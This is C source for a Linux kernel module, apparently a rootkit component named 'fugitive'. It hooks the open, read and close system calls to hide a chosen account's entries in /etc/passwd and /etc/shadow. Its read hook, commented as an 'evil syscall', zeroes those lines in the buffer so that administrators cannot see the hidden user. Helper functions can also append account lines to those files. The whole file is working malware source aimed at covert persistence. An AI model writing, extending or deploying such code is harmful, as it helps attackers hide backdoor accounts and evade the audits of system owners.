#include "fugitive.h"

/* hide/show a user in "/etc/passwd" and "/etc/shadow" */

static enum file_content_hide erase = NONE;
static int fugitive__hidden = 0;
static struct sctm_hook fugitive__hooks[3];
static char *fugitive__lines[2] = {
  NULL, /* /etc/passwd line */
  NULL /* /etc/shadow line */
};
static struct sctm *fugitive__sctm = NULL;

asmlinkage int (*good_open)(char *, int, mode_t) = NULL;
asmlinkage ssize_t (*good_read)(int, void *, size_t) = NULL;
asmlinkage int (*good_close)(int) = NULL;

/* remove a line from "/etc/passwd" and "/etc/shadow" */
int fugitive(const char __user *passwd, const char __user *shadow) {
  char *_passwd;
  char *_shadow;
  int retval;
  
  if (fugitive__hidden)
    return -EINVAL;
  
  if (fugitive__lines[0] != NULL
      || fugitive__lines[1] != NULL)
    return -EINVAL;
  
  if (passwd == NULL)
    return -EFAULT;
  
  if (shadow == NULL)
    return -EFAULT;
  _passwd = kcalloc(LINE_MAX, 1, GFP_KERNEL);
printk("kcalloc(LINE_MAX, 1, GFP_KERNEL) -> %p\n", _passwd);
  if (IS_ERR_OR_NULL(_passwd))
    return -ENOMEM;
  retval = strncpy_from_user(_passwd, passwd, LINE_MAX);
printk("strncpy_from_user(_passwd, passwd, LINE_MAX) -> %d\n", retval);
  if (retval < 0) {
    kfree(_passwd);
    return retval;
  }
  _shadow = kcalloc(LINE_MAX, 1, GFP_KERNEL);
printk("kcalloc(LINE_MAX, 1, GFP_KERNEL) -> %p\n", _shadow);
  if (IS_ERR_OR_NULL(_shadow))
    return -ENOMEM;
  retval = strncpy_from_user(_shadow, shadow, LINE_MAX);
printk("strncpy_from_user(_shadow, shadow, LINE_MAX) -> %d\n", retval);
  if (retval < 0) {
    kfree(_passwd);
    kfree(_shadow);
    return retval;
  }
//kfree(_passwd);//////////////////////////////////
//kfree(_shadow);////////////////////////////////
//return 0;//////////////////////////////////
  fugitive__lines[0] = _passwd;
  fugitive__lines[1] = _shadow;
  retval = hide_fugitive();

  if (retval) {
    kfree(_passwd);
    kfree(_shadow);
    fugitive__lines[0] = NULL;
    fugitive__lines[1] = NULL;
  } else {
    fugitive__hidden = ~0;
  }
  return retval;
}

static int fugitive__atoui(int *dest, const char *a) {
  if (dest == NULL)
    return -EFAULT;
  
  if (IS_ERR(dest))
    return -EINVAL;
  
  if (a == NULL)
    return -EFAULT;
  
  if (IS_ERR(a))
    return -EINVAL;
  *dest = 0;
  
  for (; *a; a++) {
    if (*a < '0'
        || *a > '9')
      return -EINVAL;
    *dest *= 10;
    *dest += *a - '0';
  }
  return 0;
}

int fugitive_exit(void) {
  int i;
  
  if (fugitive__sctm == NULL)
    return -EFAULT;
  
  if (IS_ERR(fugitive__sctm))
    return -EINVAL;
  
  /* unhook any remaining hooks */
  
  for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++)
    sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
  
  /* prevent a memory leak */
  
  kfree(fugitive__lines[0]); /* `kfree` should be able to handle errors/NULLs */
  return 0;
}

int fugitive_init(struct sctm *sctm) {
  if (!IS_ERR_OR_NULL(fugitive__sctm))
    return -EINVAL;
  
  if (sctm == NULL)
    return -EFAULT;
  
  if (IS_ERR(sctm))
    return -EINVAL;
  
  /* init hooks */
  
  fugitive__hooks[0] = (struct sctm_hook) {
    .call = __NR_close,
    .hook = (sctm_syscall_handler_t) &this_is_requiem
  };
  good_close = (asmlinkage int (*)(int)) &fugitive__hooks[0].original;
  fugitive__hooks[1] = (struct sctm_hook) {
    .call = __NR_open,
    .hook = (sctm_syscall_handler_t) &king_crimson
  };
  good_open = (asmlinkage int (*)(char *, int, mode_t)) &fugitive__hooks[1].original;
  fugitive__hooks[2] = (struct sctm_hook) {
    .call = __NR_read,
    .hook = (sctm_syscall_handler_t) &erase_time
  };
  good_read = (asmlinkage ssize_t (*)(int, void *, size_t)) &fugitive__hooks[2].original;
  
  fugitive__sctm = sctm;
  return 0;
}

static int fugitive__passwd_line_to_uid(uid_t *dest, const char *line) {
  char *buf;
  size_t bufsize;
  int count;
  char *p;
  int retval;
  char *start;
  
  if (line == NULL)
    return -EFAULT;
  
  if (IS_ERR(line))
    return -EINVAL;
  
  /* locate the start of the UID entry (index 2) */
  
  for (count = 0, p = (char *) line; count < 2 && *p; p++) {
    if (*p == ':')
      count++;
  }
  
  if (count != 2)
    return -EINVAL;
  start = p;
  
  /* determine buffer size */
  
  for (bufsize = 0; *p && *p != ':'; bufsize++, p++);
  
  /* allocate buffer */
  
  buf = kcalloc(bufsize + 1, 1, GFP_KERNEL);
  
  if (IS_ERR_OR_NULL(buf))
    return -ENOMEM;
  
  /* copy */
  
  strncpy(buf, start, bufsize);
  
  /* atoi */
  
  retval = fugitive__atoui(dest, buf);
  kfree(buf);
  return retval;
}

/* restore a line in "/etc/passwd" and "/etc/shadow" */
int unfugitive(const char __user *passwd, const char __user *shadow) {
  int retval;
  
  if (!fugitive__hidden)
    return -EINVAL;
  
  if (fugitive__lines[0] == NULL
      || fugitive__lines[1] == NULL)
    return -EINVAL;
  
  if (passwd == NULL)
    return -EFAULT;
  
  if (shadow == NULL)
    return -EFAULT;
  retval = show_fugitive();

  if (retval)
    fugitive__hidden = ~0;
  else {
    fugitive__hidden = 0;
    kfree(fugitive__lines[0]);
    kfree(fugitive__lines[1]);
    fugitive__lines[0] = NULL;
    fugitive__lines[1] = NULL;
  }
  return retval;
}

/*****************************************************************************/

/*int import_fugitive(){
    if(has_fug(PASSWD_PATH, PASSWD_GEN()))
        append_to_file(PASSWD_PATH, PASSWD_GEN());
    if(has_fug(SHADOW_PATH, SHADOW_GEN()))
        append_to_file(SHADOW_PATH, SHADOW_GEN());
    return 0;
}*///could be useful in a future rootkit version

int hide_fugitive(void){
    int i;
    int retval;
    /* add hooks */
    
    for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++) {
        retval = sctm_hook(fugitive__sctm, &fugitive__hooks[i]);
        
        if (retval) {
            for (; i >= 0; i--)
                sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
            return retval;
        }
    }
    return 0;
}

int show_fugitive(void){
    int i;
    
    for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++)
        sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
    return 0;
}

/* helper function. return 0 if "file_path" has line "fug" */
int has_fug(char *file_path, char *fug){
    struct file *f;
    loff_t offset;
    loff_t line_start;
    char *line_str;
    char c;

    f = filp_open(file_path, O_RDONLY, ~O_CREAT);
    line_start = offset = 0;

    if(f == NULL)
        return ENOENT;

    /* read f char by char up to '\n', then
     * compare entire line to "fug"
     */
    while(kernel_read(f, &c, sizeof(char), &offset)){
        if(c == '\n'){
            line_str = kcalloc(offset-line_start+1, sizeof(char), GFP_KERNEL);
            kernel_read(f, line_str, offset-line_start, &line_start);
            if(!strcmp(line_str, fug)){
                kfree(line_str);
                return 0;
            }
            kfree(line_str);
            line_start = offset;
        }
    }
    // did not find fugitive
    return -1;
}

/* helper function. append "fug" to the end of file at "file_path" */
ssize_t append_to_file(char *file_path, char *fug){
    struct file *f;
    loff_t offset = 0;
    ssize_t ret;

    f = filp_open(file_path, O_WRONLY, ~O_CREAT);
    if(f == NULL)
        return ENOENT;

    offset = vfs_llseek(f, offset, SEEK_END);
    ret = kernel_write(f, fug, strlen(fug), &offset);
    filp_close(f,NULL);
    return ret;
}

/* evil syscall open. hijacks read if opening account related files */
asmlinkage int king_crimson(char *pathname, int flags, mode_t mode){
    int retval;
    
    if(!strcmp(PASSWD_PATH, pathname)){
        erase = PASS_E;
        goto erase_set;
    }

    if(!strcmp(SHADOW_PATH, pathname)){
        erase = SHAD_E;
        goto erase_set;
    }

    erase_set:
    if(erase && !fugitive__hidden){
        retval = sctm_unhook(fugitive__sctm, &fugitive__hooks[2]);
        
        if (retval)
          return retval;
        fugitive__hidden = ~0;
    }
    return (*good_open)(pathname, flags, mode);
}

/* evil syscall read. deletes evil account info in buffer */
asmlinkage ssize_t erase_time(int fd, void *buf, size_t count){
    ssize_t ret;
    char *hidden = NULL;
    char *ptr = NULL;

    ret = (*good_read)(fd, buf, count);

    switch(erase){
        case PASS_E:
            hidden = fugitive__lines[0];
            break;
        case SHAD_E:
            hidden = fugitive__lines[1];
            break;
        case NONE:
            //something went wrong
            break;
    }

    if(hidden != NULL){
        ptr = strnstr(buf, hidden, count);
        if(ptr != NULL)
            memset(ptr, '\0', strlen(hidden));
    }

    return ret;
}

/* evil syscall close. restores syscall read hijacked by king_crimson */
asmlinkage int this_is_requiem(int fd){
    int retval;
    
    if(erase){
        retval = sctm_unhook(fugitive__sctm, &fugitive__hooks[2]);
        
        if (retval)
          return retval;
        erase = NONE;
        fugitive__hidden = 0;
    }
    return (*good_close)(fd);
}

